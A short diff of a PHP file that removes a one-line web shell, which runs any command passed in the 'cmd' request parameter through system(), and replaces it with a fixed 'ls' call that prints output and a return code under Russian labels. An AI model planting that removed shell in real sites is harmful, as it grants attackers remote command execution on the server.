@@ -1,1 +1,10 @@
-<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); $sstm = system($cmd); echo $sstm; echo "</pre>"; die; }?>
+<?php
+echo '<pre>';
+
+$last_line = system('ls', $retval);
+
+echo '
+</pre>
+<hr />Последняя строка вывода: ' . $last_line . '
+<hr />Код возврата: ' . $retval;
+?>
